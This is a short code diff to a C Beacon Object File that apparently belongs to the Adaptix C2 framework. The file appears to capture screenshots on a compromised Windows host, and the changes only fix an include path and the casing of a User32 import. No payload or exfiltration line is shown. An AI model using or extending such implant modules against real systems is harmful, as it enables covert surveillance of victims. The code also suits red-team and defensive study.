@@ -2,7 +2,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <gdiplus.h>
-#include "../_include/adaptix.h"
+#include "adaptix.h"
 
 #pragma comment(lib, "User32.lib")
 #pragma comment(lib, "gdiplus.lib")
@@ -30,7 +30,7 @@ DECLSPEC_IMPORT BOOL    WINAPI USER32$SetWindowPos(HWND hWnd, HWND hWndInsertAft
 DECLSPEC_IMPORT BOOL    WINAPI USER32$IsWindowVisible(HWND hWnd);
 DECLSPEC_IMPORT LONG    WINAPI USER32$GetWindowLongA(HWND hWnd, int nIndex);
 DECLSPEC_IMPORT BOOL    WINAPI GDI32$DeleteObject(HGDIOBJ hObject);
-DECLSPEC_IMPORT BOOL    WINAPI User32$SetProcessDPIAware();
+DECLSPEC_IMPORT BOOL    WINAPI USER32$SetProcessDPIAware();
 WINBASEAPI DWORD        WINAPI KERNEL32$GetLastError(VOID);
 
 DECLSPEC_IMPORT WINBASEAPI void* MSVCRT$malloc(size_t size);
@@ -235,7 +235,7 @@ void go(char* buff, int len) {
     char* note = BeaconDataExtract(&parser, NULL);
     int pid    = BeaconDataInt(&parser);
 
-    User32$SetProcessDPIAware();
+    USER32$SetProcessDPIAware();
 
     HBITMAP bmp = NULL;
     if (pid != 0) {
